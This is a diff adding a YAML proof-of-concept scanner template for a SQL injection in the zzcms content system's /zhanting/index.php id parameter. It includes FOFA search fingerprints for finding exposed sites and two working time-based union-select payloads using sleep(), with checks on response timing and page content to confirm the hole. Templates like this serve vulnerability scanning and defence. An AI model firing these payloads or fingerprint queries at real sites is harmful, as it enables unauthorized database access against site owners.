@@ -1,0 +1,37 @@
+id: poc-yaml-zzcms-index-id-sqli
+info:
+  name: zzcms接口index.php id参数存在SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: zzcms
+  fofa: body="/zx/search.php" && body="/inc/showuserlogin.php" || body="ZCMS_ShowNewMessage"
+    || body="zcms_skin" || body="/inc/showuserlogin.php" || body="/zx/search.php"
+    || body="/inc/showuserlogin.php" || title="zzcms"
+variables:
+  t1: random_int(6,9)
+  t2: t1 + 2
+  t3: random_int(1,4)
+  t4: t3 + 2
+requests:
+- method: GET
+  path: /zhanting/index.php?id=1'+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,md5(1),sleep({{.t1}})--+x&skin
+  expression: "status_code == 200 && \nduration >= t1 &&\nduration <= t2 &&\ncontains(body,\"\
+    /skin//bottom.htm\") &&\ncontains(body,\"/skin//index.htm\") &&\ncontains(body,\"\
+    关闭窗口\")\n"
+- method: GET
+  path: /zhanting/index.php?id=1'+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,md5(1),sleep({{.t3}})--+x&skin
+  expression: 'status_code == 200 &&
+
+    duration >= t3 &&
+
+    duration <= t4 &&
+
+    contains(body,"/skin//bottom.htm") &&
+
+    contains(body,"/skin//index.htm") &&
+
+    contains(body,"关闭窗口")
+
+    '
+transport: http
